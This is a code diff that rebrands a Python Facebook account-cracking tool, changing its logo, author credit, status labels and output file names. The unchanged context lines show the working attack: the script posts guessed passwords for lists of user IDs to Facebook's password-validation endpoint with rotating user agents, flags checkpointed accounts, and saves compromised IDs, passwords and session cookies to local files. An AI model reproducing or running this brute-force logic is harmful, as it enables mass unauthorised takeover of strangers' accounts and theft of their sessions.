@@ -349,21 +349,21 @@ def animation(u):
     for e in u + "\n":sys.stdout.write(e);sys.stdout.flush();time.sleep(0.01)
 #------------------[ LOGO-LAKNAT ]-----------------#
 logo =""" 
- \033[1;31m  ______      __                 __  ___      _____      
-\033[1;97m  / ____/_  __/ /_  ___  _____   /  |/  /___ _/ __(_)___ _
-\33[1;34m / /   / / / / __ \/ _ \/ ___/  / /|_/ / __ `/ /_/ / __ `/
-\33[1;35m/ /___/ /_/ / /_/ /  __/ /     / /  / / /_/ / __/ / /_/ / 
-\33[1;32m\____/\__, /_.___/\___/_/     /_/  /_/\__,_/_/ /_/\__,_/  
-\033[1;35m     /____/                                                                                  
-     ╔━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╗
-     ║ \33[0;44m[ YUKIHIRA SOMA ]\033[0;92m ║
-     ╚━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╝
+\033[1;97m d8888 8888888888P 8888888 
+\033[1;97md88888       d88P    888   
+\033[1;97md88P888      d88P     888   
+\033[1;97md88P 888     d88P      888   
+\033[1;97md88P  888    d88P       888   
+\033[1;97md88P   888   d88P        888   
+\033[1;97md8888888888  d88P         888   
+\033[1;97md88P     888 d8888888888 8888888 
+
 \033[1;27m==================================================
-[] AUTHOR       :      A R T C É
-[] TOOLS        :       ＦＩＬＥ　ＣＬＯＮＥ
-[] TYPE         :      𝐅𝐫𝐞𝐞 𝐀𝐩𝐨𝐫𝐨𝐯𝐚𝐥
-[] FACEBOOK     :      Art Cé
-[] VERSION.     :     0.7
+[] AUTHOR      :  ART CÉ
+[] TOOLS        :  FILE CLONING 
+[] TYPE          :  PAID/FREE TOOL   
+[] FACEBOOK  :  ART CÉ ACHARII
+[] VERSION     :  0.1
 =================================================="\033[1;27m"""
 os.system('clear')
 print(logo)
@@ -421,7 +421,7 @@ def approval():
       print("\33[1;32m[•] Your key Successfuly Approved")
       os.system('espeak -a 300 " permission granted"')
       time.sleep(0.2)
-      os.system('espeak -a 300 " WELCOME TO YUKI FILE CLONING TOOLS"')
+      os.system('espeak -a 300 " WELCOME TO ART FILE CLONING TOOLS"')
       msg = str(os.geteuid())
       time.sleep(0.5)
       menu()
@@ -907,9 +907,9 @@ def crack(idf,pwv):
 }        
             po = ses.post('https://m.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False)
             if "checkpoint" in po.cookies.get_dict().keys():
-                print(f'\r\033[0;96m[𝐂𝐡𝐞𝐜𝐤𝐩𝐨𝐢𝐧𝐭] {idf} • {pw}')
+                print(f'\r\033[0;96m[C.I] {idf} • {pw}')
                 os.system('espeak -a 300 " oh shit Cp ID"')
-                open('/sdcard/M1•𝐂𝐡𝐞𝐜𝐤𝐩𝐨𝐢𝐧𝐭.txt', 'a').write( uid+' | '+ps+'\n')
+                open('/sdcard/M1•DEAD.txt', 'a').write( uid+' | '+ps+'\n')
                 akun.append(idf+' • '+pw)
                 cp+=1
                 break
@@ -917,9 +917,9 @@ def crack(idf,pwv):
                 ok+=1
                 coki=po.cookies.get_dict()
                 kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
-                print(f'\r\033[0;90m[𝑺𝒖𝒄𝒄𝒆𝒔𝒔𝒇𝒖𝒍 ❤️] {idf} • {pw}\n\033[0;36m[🌺]= COOKIES • \033[0;92m{kuki} ')
+                print(f'\r\033[0;90m[ALIVE❤️] {idf} • {pw}\n\033[0;36m[🌺]= COOKIES • \033[0;92m{kuki} ')
                 os.system('espeak -a 300 "CONGRATS,  YOU,  GOT,  A,  OK,  id"')
-                open('/sdcard/M1•𝑺𝒖𝒄𝒄𝒆𝒔𝒔𝒇𝒖𝒍.txt', 'a').write( uid+' | '+ps+' | '+kuki+'\n')
+                open('/sdcard/M1•ALIVE.txt', 'a').write( uid+' | '+ps+' | '+kuki+'\n')
                 break
                 
             else:
@@ -929,7 +929,7 @@ def crack(idf,pwv):
     loop+=1
 def crackfree(idf,pwv):
     global loop,ok,cp
-    sys.stdout.write(f"\r{H}[ꜱᴄᴀɴɴɪɴɢ <M2>]{P} [{H}{loop}{P}]{P}>~<[{H}{len(id)}{P}]-[OK{P}•{H}{ok}{P}] [{P}{'{:.0%}'.format(loop/float(len(id)))}{P}]  "),
+    sys.stdout.write(f"\r{H}[CRACKING <M2>]{P} [{H}{loop}{P}]{P}>~<[{H}{len(id)}{P}]-[OK{P}•{H}{ok}{P}] [{P}{'{:.0%}'.format(loop/float(len(id)))}{P}]  "),
     sys.stdout.flush()
     ua = random.choice(ugen)
     ua2 = random.choice(ugen2)
@@ -966,9 +966,9 @@ def crackfree(idf,pwv):
 }
             po = ses.post('https://m.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False)
             if "checkpoint" in po.cookies.get_dict().keys():
-                print(f'\r\033[0;95m[{time.strftime("%H:%M")}•𝐂𝐡𝐞𝐜𝐤𝐩𝐨𝐢𝐧𝐭] {idf} • {pw}')
+                print(f'\r\033[0;95m[{time.strftime("%H:%M")}•C.I] {idf} • {pw}')
                 os.system('espeak -a 300 " oh shit Cp ID"')
-                open('/sdcard/Cyber-V6/M2•𝐂𝐡𝐞𝐜𝐤𝐩𝐨𝐢𝐧𝐭.txt', 'a').write( uid+' | '+ps+'\n')
+                open('/sdcard/Cyber-V6/M2•DEAD.txt', 'a').write( uid+' | '+ps+'\n')
                 akun.append(idf+' • '+pw)
                 cp+=1
                 break
@@ -976,9 +976,9 @@ def crackfree(idf,pwv):
                 ok+=1
                 coki=po.cookies.get_dict()
                 kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
-                print(f'\r\033[10;92m[{time.strftime("%H:%M")}•𝑺𝒖𝒄𝒄𝒆𝒔𝒔𝒇𝒖𝒍 ❤️] {idf} • {pw} ')
+                print(f'\r\033[10;92m[{time.strftime("%H:%M")}•ALIVE❤️] {idf} • {pw} ')
                 os.system('espeak -a 300 "CONGRATS,  YOU,  GOT,  AN,  OK,  id"')
-                open('/sdcard/M2•𝑺𝒖𝒄𝒄𝒆𝒔𝒔𝒇𝒖𝒍.txt', 'a').write( uid+' | '+ps+'\n')
+                open('/sdcard/M2•ALIVE.txt', 'a').write( uid+' | '+ps+'\n')
                 break
                 
             else:
